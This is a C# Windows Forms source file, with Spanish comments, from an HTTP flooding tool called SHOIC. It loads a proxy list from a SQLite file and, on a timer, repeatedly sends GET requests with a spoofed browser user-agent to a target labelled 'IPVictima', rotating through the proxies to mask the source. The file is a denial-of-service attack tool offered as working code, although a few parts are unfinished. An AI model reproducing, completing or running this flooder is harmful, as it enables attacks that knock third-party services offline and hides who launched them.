/*
 * Creado por SharpDevelop.
 * Usuario: BECKLESPINAX
 * Fecha: 17/05/2012
 * Hora: 04:22 p.m.
 */
#region {Usings}
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Data;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;

#endregion {Usings}
namespace SHOIC
{

public partial class WindowSoldier : Form
{
#region [Global]
BindingSource BindingSourceProxys=new BindingSource();
SHOICSQLite shoicsqlite;
StructConexion stconexion=new StructConexion();
string IPVictima="";
int Port=80;
string Message="DALE UNIÓN";
int Delay=1000;
System.Windows.Forms.Timer timer1=new System.Windows.Forms.Timer();
System.Windows.Forms.Timer timer2=new System.Windows.Forms.Timer();
Label labelAciertos=new Label();
Label labelFallas=new Label();
		  
DataRowView rowpro;
int port_proxy=80;
TcpClient cliente=new TcpClient();


Thread th;
#endregion [Global]

#region {Constructors}
public WindowSoldier(string IPvic,int port,int delay, string mess, ref Label LabelAciertos, ref Label LabelFallas)
{
InitializeComponent();

labelAciertos=LabelAciertos;
labelFallas=LabelFallas;        
IPVictima=IPvic;
Port=port;
Message=mess;
Delay=delay;

this.Show();
}

#endregion {Constructors}

#region {Métodos}
void ColocarFallasYAciertos(ref Label lba,ref Label lbf)
{
	
}

void CargarProxys()
{   
stconexion.server="DATA\\proxys.sqlite3; Version=3;New=True;Compress=True;";
stconexion.table="proxys";
shoicsqlite=new SHOICSQLite(ref BindingSourceProxys,stconexion);
//MessageBox.Show("LLEGA");
shoicsqlite.CrearBBDDSiNoExiste();
shoicsqlite.CargarRegistros();
}
	
public void Start()
{try{
		
	if(Delay==0)
	Delay++;
	Delay=Delay*1000;
	//timer1.Interval = Delay;
	timer1.Interval = 2000;
	
	timer2.Interval=1500;
	//MessageBox.Show(Delay.ToString());
	
if (timer1.Enabled == false)
    {
    timer1.Enabled = true; //Si no corre el timer, esto lo inicia
    }
    timer2.Enabled = true;
//MessageBox.Show("ACA");
    timer1.Start();
    timer2.Start();
}catch{}
			
}

public void Stop()
{
timer1.Enabled = false; //Si el timer corre, esto lo para
timer2.Enabled = false; //Si el timer corre, esto lo para
timer1.Stop();
timer2.Stop();
}
	
	
void Conectando()
{
Thread th=new Thread(Atacar);
}


int Conectar(string IPproxy, int PuertoProxy, string IPblanco, Int32 Puerto, string mensaje)
{
 //Conecta a IPblanco en el puerto enviando la peticion "mensaje"
//Usar bajo la propia responsabilidad...
try
{
	
//Primero hago un Ping a ese Proxy a ver si funca
int timeOut=500;
Ping ping = new Ping();
PingReply reply=ping.Send(IPproxy, timeOut);
//MessageBox.Show(reply.Status.ToString());
//TimedOut
if(reply.Status.ToString()!="TimedOut")
{
this.Text="IP: "+IPproxy.ToString()+" PORT: "+PuertoProxy.ToString();
TcpClient cliente;
cliente=new TcpClient();
//cliente.Connect(IPproxy, PuertoProxy);
//MessageBox.Show("·");
//cliente = new TcpClient(IPproxy, PuertoProxy); //Crea un cliente

Byte[] data = new Byte[128];
data = System.Text.Encoding.ASCII.GetBytes("GET " + mensaje + " HTTP/1.1\nHost:" + IPblanco + ":" + Puerto + "\nUser-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10\n\n"); //Pasa el mensaje a la variable byte data
//cliente.ReceiveTimeout=1000;
//cliente.SendTimeout=1500;
cliente.Connect(IPproxy, PuertoProxy);
//MessageBox.Show(IPproxy.ToString());
NetworkStream stream = cliente.GetStream();
stream.Write(data, 0, data.Length); //Escribe en el flujo de datos del cliente el mensaje
stream.Close();
//cliente.NoDelay=false;
cliente.Close(); //Cierra todo
//stream.Dispose();
}
return 1;
}
catch (ArgumentNullException e)
{
// no es necesario MessageBox.Show("ArgumentNullException: " + e);
return 0;
}
catch 
{
// no es necesario MessageBox.Show("SocketException: " + e.ToString());
return 0;
}
}
        
public int count = 0; //Dos contadores. count: indicara segundos. 
public int ticks = 0; //ticks: indicara ticks del timer
private void timer1_Tick(object sender, EventArgs e)
{

Atacar();
}
private void timer2_Tick(object sender, EventArgs e)
{
//cliente.Close();
//Atacar();	
}



void Atacar()
{//MessageBox.Show("TT");
//this.Text=count.ToString();
try{
if (count >= BindingSourceProxys.Count)
count = 0; //Si count sobrepasa el largo de la lista de proxys, vuelve a 0
BindingSourceProxys.Position=count; //Muestra al usuario el proxy en uso
            
rowpro=(DataRowView)BindingSourceProxys[count];
count++; //Si paso un segundo, aumenta count
cliente.Close(); //Cierra todo

if (count >= BindingSourceProxys.Count)
count = 0; //Si count sobrepasa el largo de la lista de proxys, vuelve a 0
BindingSourceProxys.MoveNext();//.Position=count; //Muestra al usuario el proxy en uso
    
//this.Text="LALALA"+count;


//MessageBox.Show(rowpro["ip_proxy"].ToString()+" "+rowpro["puerto_proxy"].ToString());
string strinprox="12.150.97.75";   
try{port_proxy=Convert.ToInt32(rowpro["puerto_proxy"]);}catch{port_proxy=80;}
try{strinprox=rowpro["ip_proxy"].ToString();}catch{}
int respuesta=0; 


try{respuesta=Conectar(strinprox,port_proxy ,IPVictima,Port , Message);}catch{}


/*    if (respuesta == 1)
                labelAciertos.Text = Convert.ToString(Convert.ToUInt32(labelAciertos.Text) + 1);
            if (respuesta == 0)
                labelFallas.Text = Convert.ToString(Convert.ToUInt32(labelFallas.Text) + 1);
*/
//MessageBox.Show("VA");
//cliente=new TcpClient();
//cliente.Close(); //Cierra todo

            //ticks += 1;
            //if (ticks / (1000 / Convert.ToInt32(Delay)) == ticks / (1000.0 / Convert.ToInt32(Delay)))

}catch{count++;} 

        }
 
#endregion {Métodos}
		
void VentanaHTTPFlooderSHOICAccionLoad(object sender, EventArgs e)
{
CargarProxys();
GrillaProxys.DataSource=BindingSourceProxys;
GrillaProxys.Columns["codigo_proxy"].Visible=false;
GrillaProxys.Columns["ip_proxy"].HeaderText="IP";
GrillaProxys.Columns["puerto_proxy"].HeaderText="Puerto";
GrillaProxys.RowHeadersVisible=false;
timer1.Tick += new System.EventHandler(this.timer1_Tick);
timer2.Tick += new System.EventHandler(this.timer2_Tick);

this.Start();

		}
	}//Fin clase
}//Fin namespace
